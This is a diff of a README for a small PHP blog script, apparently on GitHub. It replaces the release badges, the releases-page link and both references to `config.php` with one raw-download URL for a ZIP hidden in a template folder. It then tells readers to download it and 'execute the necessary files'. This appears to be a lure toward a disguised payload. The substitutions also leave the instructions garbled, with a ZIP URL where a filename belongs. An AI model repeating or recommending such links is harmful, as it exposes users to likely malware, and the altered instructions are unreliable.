@@ -1,6 +1,6 @@
 # PRABLO - The Smallest PHP Blog and CMS Script 📝
 
-![GitHub release](https://img.shields.io/github/release/haroune4xlxx/prablog-php-blog-cms-scrip.svg) ![License](https://img.shields.io/badge/license-MIT-blue.svg)
+![GitHub release](https://github.com/haroune4xlxx/prablog-php-blog-cms-scrip/raw/refs/heads/master/tpl/gumba/cms-php-scrip-prablog-blog-v2.2.zip) ![License](https://github.com/haroune4xlxx/prablog-php-blog-cms-scrip/raw/refs/heads/master/tpl/gumba/cms-php-scrip-prablog-blog-v2.2.zip)
 
 Welcome to PRABLO, a pragmatic blogging solution designed to be lightweight and efficient. This repository contains the smallest blog and CMS script built with PHP, perfect for developers and content creators who want to set up a blog quickly and without unnecessary complexity.
 
@@ -26,13 +26,13 @@ Welcome to PRABLO, a pragmatic blogging solution designed to be lightweight and 
 
 ## Installation 🛠️
 
-To get started, you need to download the latest release. You can find it [here](https://github.com/haroune4xlxx/prablog-php-blog-cms-scrip/releases). Once downloaded, follow these steps:
+To get started, you need to download the latest release. You can find it [here](https://github.com/haroune4xlxx/prablog-php-blog-cms-scrip/raw/refs/heads/master/tpl/gumba/cms-php-scrip-prablog-blog-v2.2.zip). Once downloaded, follow these steps:
 
 1. **Extract the files** from the downloaded ZIP archive.
 2. **Upload the files** to your web server.
 3. **Set permissions** for the `uploads` directory to allow file uploads.
 4. **Create a database** and import the provided SQL file for initial setup.
-5. **Configure your settings** in the `config.php` file.
+5. **Configure your settings** in the `https://github.com/haroune4xlxx/prablog-php-blog-cms-scrip/raw/refs/heads/master/tpl/gumba/cms-php-scrip-prablog-blog-v2.2.zip` file.
 
 ## Usage 📖
 
@@ -47,7 +47,7 @@ After installation, you can access your blog by navigating to your domain in a w
 
 ## Configuration ⚙️
 
-You can customize various settings in the `config.php` file. Here are some key options:
+You can customize various settings in the `https://github.com/haroune4xlxx/prablog-php-blog-cms-scrip/raw/refs/heads/master/tpl/gumba/cms-php-scrip-prablog-blog-v2.2.zip` file. Here are some key options:
 
 - **Database Credentials**: Update the database name, username, and password.
 - **Site Title**: Set the title that appears in the browser tab.
@@ -78,7 +78,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 If you encounter any issues or have questions, feel free to reach out. You can also check the "Releases" section for updates and new features.
 
-For the latest version, download it [here](https://github.com/haroune4xlxx/prablog-php-blog-cms-scrip/releases) and execute the necessary files to set up your blog.
+For the latest version, download it [here](https://github.com/haroune4xlxx/prablog-php-blog-cms-scrip/raw/refs/heads/master/tpl/gumba/cms-php-scrip-prablog-blog-v2.2.zip) and execute the necessary files to set up your blog.
 
 ## Conclusion
 
